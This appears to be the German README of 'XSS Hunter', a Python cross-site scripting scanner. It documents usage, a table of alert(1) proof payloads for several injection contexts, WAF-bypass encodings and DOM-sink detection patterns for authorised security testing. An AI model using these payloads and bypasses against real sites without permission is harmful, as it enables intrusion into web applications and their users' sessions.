# XSS Hunter

**Advanced Cross-Site Scripting Detection Tool**  
von G4MEOVER18 (Yanis)

---

> **Inspiriert von / Credits an:**  
> [XSStrike](https://github.com/s0md3v/XSStrike) von **s0md3v** — das Original und meistgenutzte XSS-Detection-Tool der Community.  
> XSS Hunter baut auf denselben Grundprinzipien auf, erweitert diese jedoch deutlich um WAF-Detection, DOM-Sink-Analyse, Crawling, Form-Injection und einen umfangreichen Payload-Kontext-Katalog.

---

## Features

| Feature | Beschreibung |
|---|---|
| **Reflected XSS Detection** | Canary-String → Reflection-Check → Payload-Injektion |
| **Payload Library (40+)** | HTML, Attribute, Script, SVG, Event-Handler, URL-Kontext, Bypass-Varianten |
| **WAF Detection** | Fingerprinting per Response-Header + Body: Cloudflare, Akamai, ModSecurity, F5, Imperva, Sucuri, AWS WAF, Barracuda |
| **WAF Bypass Variants** | Case-Mixing, HTML-Entities, JS-Unicode-Escapes, Comment-Injection, Double-Encoding |
| **Form Auto-Detection** | Alle `<form>`-Elemente parsen, alle Felder testen (GET + POST) |
| **Cookie Injection** | `--cookies` Flag für authentifizierte Scans |
| **DOM XSS Hints** | Dangerous JS Sinks: `innerHTML`, `document.write`, `eval`, `setTimeout(string)`, jQuery `.html()`, etc. |
| **Crawl Mode** | `--crawl` folgt Links auf derselben Domain, scannt alle gefundenen URLs |
| **JSON Export** | `--json results.json` — maschinenlesbarer Befund-Report |
| **Farbige Ausgabe** | ANSI-Terminal-Colors, Severity HIGH/MEDIUM/INFO |
| **Verbosity Levels** | `-v` (medium) / `-vv` (debug) |
| **Pure Python** | Keine externen Dependencies — nur Python stdlib |

---

## Installation

```bash
git clone https://github.com/G4MEOVER18/xss-hunter.git
cd xss-hunter
python xss_hunter.py --help
```

Python 3.8+ wird benötigt. Keine pip-Installation erforderlich.

---

## Verwendung

### Grundlegender Scan

```bash
python xss_hunter.py -u "https://target.com/search?q=test"
```

### Mit Verbosity und WAF-Bypass-Varianten

```bash
python xss_hunter.py -u "https://target.com/search?q=test" -v --variants
```

### Crawl-Modus (gesamte Domain)

```bash
python xss_hunter.py -u "https://target.com" --crawl --max-pages 30
```

### Authentifizierter Scan mit Cookies

```bash
python xss_hunter.py -u "https://target.com/dashboard?id=5" \
  --cookies "session=abc123; role=admin"
```

### JSON-Report exportieren

```bash
python xss_hunter.py -u "https://target.com/page?param=x" \
  --json bericht.json -v
```

### Mit eigenen HTTP-Headern

```bash
python xss_hunter.py -u "https://target.com/api?q=x" \
  --headers "Authorization: Bearer eyJ..." \
  --json results.json -vv
```

### Alle Optionen

```
  -u URL, --url URL         Ziel-URL (erforderlich)
  --crawl                   Same-Domain-Links verfolgen und alle scannen
  --max-pages N             Max. Seiten beim Crawlen (Standard: 50)
  --cookies STRING          Cookie-String z.B. "session=abc; role=user"
  --headers STRING          Zusätzliche Header z.B. "X-Custom: val"
  --json FILE               Befunde als JSON exportieren
  --variants                WAF-Bypass-Payload-Varianten generieren
  -v, --verbose             Verbosität erhöhen (-v oder -vv)
  --no-banner               ASCII-Banner unterdrücken
```

---

## Payload-Kontext-Tabelle

| Kontext | Beispiel-Payload | Beschreibung |
|---|---|---|
| `html` | `<script>alert(1)</script>` | Direkte Script-Injektion in HTML |
| `attribute` | `" onmouseover="alert(1)` | Attribut-Breakout + Event-Handler |
| `script` | `';alert(1)//` | Breakout aus bestehendem `<script>` |
| `svg` | `<svg onload=alert(1)>` | SVG-basierte Event-Ausführung |
| `event` | `<img src=x onerror=alert(1)>` | Inline Event-Handler |
| `url` | `javascript:alert(1)` | Protocol-Handler in href/src |
| `bypass` | `<ScRiPt>alert(1)</ScRiPt>` | WAF-Umgehung durch Case/Encoding |

---

## WAF-Bypass-Techniken

Wenn `--variants` aktiviert ist, werden folgende Techniken automatisch angewendet:

- **Case Mixing** — `<ScRiPt>`, `OnErRoR=`
- **HTML Entities** — `&#97;lert(1)`, `&#x61;lert`
- **Comment Injection** — `<scr<!---->ipt>`
- **URL Encoding** — `%3Cscript%3E`
- **Double Encoding** — `%253Cscript%253E`
- **Null Bytes** — `ale\x00rt(1)`

---

## DOM XSS Erkennung

XSS Hunter scannt alle `<script>`-Blöcke auf gefährliche Sinks:

| Sink | Risiko |
|---|---|
| `innerHTML =` | HIGH |
| `document.write(` | HIGH |
| `eval(` | HIGH |
| `setTimeout("string"` | HIGH |
| `location.href =` | MEDIUM |
| `insertAdjacentHTML(` | HIGH |
| `$(selector).html(` | MEDIUM |
| `createContextualFragment(` | HIGH |

Werden Quellen wie `location.hash`, `location.search` oder `URLSearchParams` in Kombination mit einem Sink erkannt, wird die Severity auf MEDIUM angehoben.

---

## JSON-Report Beispiel

```json
{
  "tool": "XSS Hunter v1.0",
  "author": "G4MEOVER18 (Yanis)",
  "timestamp": "2026-05-22T20:00:00Z",
  "total": 2,
  "findings": [
    {
      "type": "XSS_REFLECTED",
      "url": "https://target.com/search?q=<script>alert(1)</script>",
      "param": "q",
      "payload": "<script>alert(1)</script>",
      "context": "html",
      "severity": "HIGH",
      "detail": "Reflected XSS via param 'q', context: html"
    },
    {
      "type": "DOM_SINK",
      "url": "https://target.com/search",
      "sink": "innerHTML",
      "severity": "MEDIUM",
      "detail": "Dangerous JS sink detected: innerHTML | Possible sources: location.search"
    }
  ]
}
```

---

## Rechtlicher Hinweis

Dieses Tool ist **ausschließlich für autorisierte Sicherheitstests** bestimmt.  
Der Einsatz gegen Systeme ohne ausdrückliche Genehmigung des Eigentümers ist illegal.  
Der Autor übernimmt keinerlei Haftung für Missbrauch.

---

## Credits & Danksagung

- **s0md3v** — für [XSStrike](https://github.com/s0md3v/XSStrike), das die Grundlage und Inspiration für dieses Tool bildete
- Die Security-Community für Payload-Forschung (PortSwigger, PayloadAllTheThings)

---

## Lizenz

MIT License — Copyright (c) 2026 G4MEOVER18

---

## Unterstütze dieses Projekt

Bitcoin: `39vZWmnUwDReQ15BwqQXzyqVQ6U8LardEf`
